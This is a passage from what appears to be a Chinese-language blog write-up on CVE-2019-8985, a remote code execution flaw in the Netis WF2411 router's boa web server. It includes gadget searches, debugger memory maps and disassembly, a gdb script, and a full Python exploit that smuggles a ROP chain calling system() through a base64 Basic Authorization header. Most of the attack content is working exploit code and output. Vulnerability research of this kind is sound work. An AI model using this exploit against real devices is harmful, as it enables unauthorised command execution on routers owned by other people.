class=&#34;number&#34;&gt;0x78&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;sprintf 的逆向语句如下&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sprintf(dest, &amp;quot;%s:%s&amp;quot;, username, password);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;boa&lt;/code&gt;  has two loaded libraries,  &lt;code&gt;libC&lt;/code&gt;  and  &lt;code&gt;libgcc&lt;/code&gt; .&lt;/p&gt;
&lt;p&gt;审视一波 libc.so.0&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;Python&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;mipsrop.stackfinder()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;----------------------------------------------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|  Address     |  Action                                              |  Control Jump                          |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;----------------------------------------------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|  0x000068AC  |  addiu $a0,$sp,0x20+var_8                            |  jalr  $v0                             |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|  0x0000711C  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|  0x000074BC  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|  0x00020660  |  addiu $a0,$sp,0x30+var_18                           |  jalr  $a0                             |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|  0x000071E4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|  0x00008AD4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|  0x0000A3CC  |  addiu $a2,$sp,0x40+var_28                           |  jr    0x40+var_sC($sp)                |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|  0x000125E0  |  addiu $a2,$sp,0x18+arg_8                            |  jr    0x18+var_s0($sp)                |&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;没有可用的 gadget&lt;br&gt;
 再到 libgcc 中找 第二列有 a0 第三列有 s0 ~ s4 就行&lt;br&gt;
找到这个 也就是要确保&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;binsh 地址在 sp + 0x18 (但这个是在执行了 &lt;code&gt;addiu   $sp, 0x78&lt;/code&gt;  之后的)&lt;/li&gt;
&lt;li&gt;而 system 在 s3 （sp + 0xc）&lt;/li&gt;
&lt;li&gt;ra 在 sp +0x14&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABD4                 move    $a1, $s2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABD8                 move    $s0, $zero&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABDC                 move    $t9, $s3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABE0                 jalr    $t9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0000ABE4                 movz    $s0, $v0, $v1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 qemu 内模拟&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;pwndbg&amp;gt; &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;vmmap&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x400000   0x419000 r-xp    19000 0      /bin/boa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x459000   0x45a000 rw-p     1000 19000  /bin/boa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x45a000   0x466000 rwxp     c000 0      [heap]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77ee2000 0x77eee000 r-xp     c000 0      /lib/libgcc_s_4181.so.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77eee000 0x77f2d000 ---p    3f000 0      [anon_77eee]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77f2d000 0x77f2e000 rw-p     1000 b000   /lib/libgcc_s_4181.so.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77f2e000 0x77f6c000 r-xp    3e000 0      /lib/libc.so.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77f6c000 0x77fac000 ---p    40000 0      [anon_77f6c]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77fac000 0x77fad000 rw-p     1000 3e000  /lib/libc.so.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77fad000 0x77fb1000 rw-p     4000 0      [anon_77fad]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77fb1000 0x77fb7000 r-xp     6000 0      /lib/ld-uClibc.so.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77ff5000 0x77ff6000 rw-p     1000 0      [anon_77ff5]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77ff6000 0x77ff7000 r--p     1000 5000   /lib/ld-uClibc.so.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x77ff7000 0x77ff8000 rw-p     1000 6000   /lib/ld-uClibc.so.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x7f9ee000 0x7fff7000 rwxp   609000 0      [stack]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x7fff7000 0x7fff8000 r-xp     1000 0      [vdso]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;gdb 定位到地址&lt;br&gt;
&lt;img src=&#34;/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220718180751.png&#34; alt&gt;&lt;br&gt;
可以看到由于 boa 的限制 ✨TODO&lt;br&gt;
 我们只溢出了 17 个 cmd 的字节命令&lt;br&gt;
而 cmd 需要放在 &lt;code&gt;0x40800368&lt;/code&gt;  的位置 也就是 esp + 0x18  &lt;code&gt;0x40800350 + 0x18&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;从这一段可以看出&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;► 0x4146dc &amp;lt;user_ok+460&amp;gt;    lw     $ra, 0x74($sp)                &amp;lt;0x4146cc&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x4146e0 &amp;lt;user_ok+464&amp;gt;    lw     $s4, 0x70($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x4146e4 &amp;lt;user_ok+468&amp;gt;    lw     $s3, 0x6c($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x4146e8 &amp;lt;user_ok+472&amp;gt;    lw     $s2, 0x68($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x4146ec &amp;lt;user_ok+476&amp;gt;    lw     $s1, 0x64($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x4146f0 &amp;lt;user_ok+480&amp;gt;    lw     $s0, 0x60($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  0x4146f4 &amp;lt;user_ok+484&amp;gt;    jr     $ra&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ra 在 sp + 0x74 的位置&lt;br&gt;
而 jr 之前会做一次 &lt;code&gt;.text:004146F8                 addiu   $sp, 0x78&lt;/code&gt; &lt;br&gt;
 而 gadget 里的 cmd 地址是 &lt;code&gt;addiu   $a0, $sp, 0x20+var_8&lt;/code&gt; &lt;br&gt;
 也就是放在 ra 上  &lt;code&gt;0x78 - 0x74 + 0x18&lt;/code&gt;  =  &lt;code&gt;0x1c&lt;/code&gt;  的位置&lt;/p&gt;
&lt;p&gt;exp 如下&lt;br&gt;
 s3 的位置是 &lt;code&gt;sp + 0x6c&lt;/code&gt;  溢出点离 s0 是  &lt;code&gt;0x40&lt;/code&gt; &lt;br&gt;
 所以溢出点离 s3 是 &lt;code&gt;0x4c&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; socket&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc   	= &lt;span class=&#34;number&#34;&gt;0x77f2e000&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libgcc 	= &lt;span class=&#34;number&#34;&gt;0x77ee2000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gadget 	= &lt;span class=&#34;number&#34;&gt;0x0000ABD0&lt;/span&gt; + libgcc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system	= &lt;span class=&#34;number&#34;&gt;0x0002AC90&lt;/span&gt; + libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MAXSZ	= &lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# cmd		= b&amp;quot;FUCK&amp;quot; * 50 # 看看长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cmd		= &lt;span class=&#34;string&#34;&gt;b&amp;quot;mkdir hack&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch = &lt;span class=&#34;string&#34;&gt;&amp;quot;mips&amp;quot;&lt;/span&gt;, endian = &lt;span class=&#34;string&#34;&gt;&amp;quot;big&amp;quot;&lt;/span&gt;, os = &lt;span class=&#34;string&#34;&gt;&amp;quot;Linux&amp;quot;&lt;/span&gt;, log_level = &lt;span class=&#34;string&#34;&gt;&amp;quot;DEBUG&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# fork 0x77f34d30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;exp&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;[+] gadget is &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(gadget)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;[+] system is &lt;span class=&#34;subst&#34;&gt;&amp;#123;&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system)&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload  = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a:%s&amp;#x27;&lt;/span&gt; %(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt; * (&lt;span class=&#34;number&#34;&gt;0x4C&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)) &lt;span class=&#34;comment&#34;&gt;# padding + s0~s2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p32(system)					&lt;span class=&#34;comment&#34;&gt;# s3 &amp;lt;- esp + 0x0c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += &lt;span class=&#34;string&#34;&gt;b&amp;#x27;AAAA&amp;#x27;&lt;/span&gt;						&lt;span class=&#34;comment&#34;&gt;# s4 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += p32(gadget) 					&lt;span class=&#34;comment&#34;&gt;# ra &amp;lt;- esp + 0x14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += &lt;span class=&#34;string&#34;&gt;b&amp;quot;BBBB&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += &lt;span class=&#34;string&#34;&gt;b&amp;quot;BBBB&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += &lt;span class=&#34;string&#34;&gt;b&amp;quot;BBBB&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += &lt;span class=&#34;string&#34;&gt;b&amp;quot;BBBB&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += &lt;span class=&#34;string&#34;&gt;b&amp;quot;BBBB&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += &lt;span class=&#34;string&#34;&gt;b&amp;quot;BBBB&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload += cmd  						&lt;span class=&#34;comment&#34;&gt;# 	 &amp;lt;- esp + 0x30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	header   = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;GET / HTTP/1.1\r\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;# header  += b&amp;#x27;Host: 127.0.0.1:80\r\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	header  += &lt;span class=&#34;string&#34;&gt;b&amp;#x27;Host: 10.10.10.1:80\r\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	header  += &lt;span class=&#34;string&#34;&gt;b&amp;#x27;Authorization: Basic %s\r\n&amp;#x27;&lt;/span&gt; % base64.b64encode(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	header  += &lt;span class=&#34;string&#34;&gt;b&amp;#x27;User-Agent: Real UserAgent\r\n\r\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	iport = (&lt;span class=&#34;string&#34;&gt;&amp;quot;10.10.10.1&amp;quot;&lt;/span&gt; ,&lt;span class=&#34;number&#34;&gt;80&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;# iport = (&amp;quot;127.0.0.1&amp;quot; ,80)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	s.connect(iport)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	s.send(header)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	msg = s.recv(MAXSZ)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] Message is %s&amp;quot;&lt;/span&gt; %(msg))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	s.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	exp()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;gdb 调试脚本&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;set arch mips&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set endian big&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set solib-search-path sqrootfs/lib/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b *0x4146f4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target remote 10.10.10.1:8888&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;程序是 chroot 到 /web 页面下了 所以 mkdir 是在 web 下&lt;br&gt;
&lt;img src=&#34;/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/2.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;17 个字节的溢出是很难造成反向 shell 的 也就只能造成一次 17 字节的任意命令执行&lt;br&gt;
重新考虑 rop&lt;/p&gt;
&lt;h2 id=&#34;更好的rop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#更好的rop&#34;&gt;#&lt;/a&gt; 更好的 ROP&lt;/h2&gt;
&lt;p&gt;目标 让最后的 a0 尽可能的接近 sp 的位置&lt;br&gt;
